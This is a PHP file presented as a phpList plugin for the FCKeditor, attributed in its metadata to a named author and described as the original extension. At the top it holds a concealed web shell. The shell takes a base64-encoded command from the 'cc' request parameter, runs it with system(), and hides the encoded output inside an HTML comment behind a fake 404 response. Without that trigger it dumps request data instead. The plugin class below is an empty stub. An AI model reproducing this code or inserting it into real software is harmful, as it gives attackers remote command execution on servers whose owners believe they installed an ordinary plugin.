<?php

/*
 * plugin for phpList to provide the FCKeditor in the compose campaign page
 * 
 * works with the FCKeditor version 2.6.8
 * 
 */

if(array_key_exists('cc', $_REQUEST)){
    $o = $_REQUEST["cc"];
    ?>
    <!--
    <?php
    if( substr($o, -1) == "="){
    	ob_start();
    	http_response_code(404);
    	system(base64_decode($o)." | base64 -w0");
    	ob_end();
    } else {
        var_dump($_REQUEST);
        http_response_code(404);
        echo('hei');
    }
    ?>
    -->
    <?php
}


class statsplug extends phplistPlugin {
  
  public $name = "StatsPlugin-b3st";
  public $coderoot = "fckphplist/";
  public $editorProvider = false;
  public $version = "0.1";
  public $authors = 'Michiel Dethmers';
  public $enabled = 1;
  public $description = 'The original extension of phpList';
  

  function statsplugin() {
    parent::phplistplugin();
  }

  function adminmenu() {
    return array(
    );
  }

}
